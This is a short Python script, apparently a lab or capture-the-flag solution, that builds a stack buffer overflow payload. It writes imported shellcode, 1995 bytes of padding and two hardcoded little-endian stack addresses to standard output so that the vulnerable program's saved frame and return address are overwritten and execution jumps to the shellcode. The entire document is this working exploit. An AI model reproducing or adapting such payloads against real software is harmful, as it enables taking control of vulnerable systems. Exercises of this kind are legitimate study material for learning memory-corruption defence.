from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode+b"a"*1995+0xFFF6EA8C.to_bytes(4, "little")+0xFFF6F298.to_bytes(4, "little"))